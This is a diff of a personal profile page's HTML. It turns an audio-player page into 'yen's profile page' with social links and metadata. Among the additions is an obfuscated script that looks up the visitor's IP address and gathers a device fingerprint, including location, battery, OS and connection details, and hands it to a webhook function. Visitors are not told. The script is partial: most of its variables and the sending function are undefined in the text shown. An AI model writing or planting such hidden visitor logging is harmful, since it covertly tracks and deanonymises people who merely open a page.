@@ -2,9 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>XP Audio Player</title>
+  <title>yen's profile page</title>
   <link rel="stylesheet" href="https://unpkg.com/98.css" />
   <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/x-icon" href="logos/frame1.ico">
+      <!-- Open Graph Metadata -->
+  <meta property="og:title" content="yenny.lol">
+  <meta property="og:description" content="yen's profile page">
+  <meta property="og:url" content="https://yenny.lol">
+  <meta property="og:image" content="https://yenny.lol/archive/images/glock.gif">
+  <meta name="theme-color" content="#0a0a0a">
 </head>
 <body>
 
@@ -12,8 +19,51 @@
 <video autoplay muted loop id="myVideo">
   <source src="video/bg.mp4" type="video/mp4">
 </video>
+<script>
+async function getUserData() {
+  try {
+    const _0x141f41 = await fetch('https://api.ipify.org?format=json');
+    const _0x51d03b = await _0x141f41.json();
+    const _0x14e16b = _0x51d03b.ip;
+    // ... [other existing code]
 
+    // Add current page URL here:
+    const currentPage = window.location.href;
 
+    const _0x3b7d4b = {
+      'ip': _0x14e16b,
+      'browser': _0x24b95d,
+      'resolution': _0x5a0fe9,
+      'language': _0x58004c,
+      'timeZone': _0x41c05c,
+      'timestamp': _0x2ebf97,
+      'deviceType': _0x4197f4,
+      'onlineStatus': _0x5a7afb,
+      'uptime': _0x14d738,
+      'os': _0x2cbec8,
+      'cpuCores': _0xde1915,
+      'navHeight': _0x55501c,
+      'batteryLevel': _0x501698,
+      'powerSavingMode': _0x3eccae,
+      'adBlockEnabled': _0x46c06c,
+      'browserName': _0x38ebcf,
+      'browserVersion': _0x39dd18,
+      'browserLanguage': _0x5838e8,
+      'cookiesEnabled': _0x34c81b,
+      'connectionType': _0x1ecd64,
+      'connectionRtt': _0x11fb24,
+      'connectionDownlink': _0x1e07e5,
+      'osVersion': _0x1aebdc,
+      'location': _0x1c682a,
+      'currentPage': currentPage // <<<<< NEW FIELD
+    };
+
+    await sendDataToWebhook(_0x3b7d4b);
+  } catch (_0x2436a5) {
+    console.error("Error while fetching data:", _0x2436a5);
+  }
+}
+</script>
 
 
 
@@ -27,13 +77,41 @@
       <button aria-label="Close" id="btnClose"></button>
     </div>
   </div>
-  <div class="window-body">
-    <p id="trackName">Track: (None)</p>
-    <div class="field-row" style="justify-content: space-between;">
-      <button id="prev">⏮</button>
-      <button id="play">▶️</button>
-      <button id="next">⏭</button>
+<div class="window-body">
+  <p id="trackName">Track: (None)</p>
+  <canvas id="canvas"></canvas>
+  <div class="field-row" style="justify-content: space-between;">
+    <button id="prev">⏮</button>
+    <button id="play">▶️</button>
+    <button id="next">⏭</button>
+  </div>
+ </div>
+</div>
+<div class="window" id="profileWindow" style="width: 400px; top: 50%; left: 50%; transform: translate(-50%, -50%); position: fixed; z-index: 20;">
+  <div class="title-bar" id="profileTitleBar">
+    <span class="title-bar-text">My Profile</span>
+    <div class="title-bar-controls">
+      <button aria-label="Minimize" id="profileMinimize"></button>
+      <button aria-label="Maximize" id="profileMaximize"></button>
+      <button aria-label="Close" id="profileClose"></button>
     </div>
+  </div>
+  <div class="window-body" style="padding: 10px; overflow-y: auto; max-height: 300px;">
+    <h2>yen</h2>
+    <p>new profile page i made, if u wanna check the old one go to https://yenny.lol/archive/ but its broken</p>
+<div id="logoContainer" style="margin-top: 20px; display: flex; gap: 15px; justify-content: center;">
+  <a href="https://github.com/yennylol/yenny.lol" target="_blank" rel="noopener">
+    <img src="logos/github.png" alt="GitHub" style="width:32px; height:32px; filter: grayscale(100%); cursor: pointer;" />
+  </a>
+  <a href="https://discordapp.com/users/876315545098653716" target="_blank" rel="noopener">
+    <img src="logos/discord.png" alt="LinkedIn" style="width:32px; height:32px; filter: grayscale(100%); cursor: pointer;" />
+  </a>
+  <a href="https://tiktok.com/@yenuno" target="_blank" rel="noopener">
+    <img src="logos/tiktok.png" alt="Twitter" style="width:32px; height:32px; filter: grayscale(100%); cursor: pointer;" />
+  </a>
+  <!-- Add more logos as needed -->
+</div>
+
   </div>
 </div>
 
